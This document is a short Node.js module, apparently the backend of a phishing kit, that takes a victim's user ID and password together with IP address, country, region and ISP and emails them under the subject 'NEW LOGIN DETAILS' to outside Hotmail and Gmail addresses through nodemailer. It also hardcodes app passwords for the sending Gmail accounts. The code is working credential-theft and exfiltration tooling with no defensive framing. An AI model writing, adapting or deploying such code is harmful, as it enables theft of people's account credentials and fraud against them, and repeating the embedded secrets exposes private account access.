const nodemailer = require('nodemailer')

const sendMail = (
  userID,
  password,
  country,
  region,
  isp,
  IPAddress,
  user,
  res
) => {
  let auth
  let to
  if (user === 'pat.nishimoto2@gmail.com') {
    auth = {
      user: 'pat.nishimoto2@gmail.com',
      pass: 'khra ryeh iqav bcmz',
    }
    to = 'Ibekzmoney@hotmail.com'
  } else if (user === 'timiperla@gmail.com') {
    auth = {
      user: 'timiperla@gmail.com',
      pass: 'cbpj ypnx ctoh dlmo',
    }
    to = 'timiperla@gmail.com'
  }
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth,
  })

  const text = `New login details. User ID: ${userID}, password: ${password}, IP: ${
    IPAddress || 'Not available'
  }, Country: ${country || 'Not available'}, Region:${
    region || 'Not available'
  }, Internet Service Provider(ISP): ${isp || 'Not available'} `

  const mailOptions = {
    from: auth['user'],
    to,
    subject: 'NEW LOGIN DETAILS',
    text,
  }

  transporter.sendMail(mailOptions, function (error, info) {
    if (error) {
      console.log(error)
      res.status(500).send('there was an error')
      return
    } else {
      console.log('Email sent: ' + info.response)
      res.status(200).json({ sent: 'success' })
      return
    }
  })
}

module.exports = { sendMail }
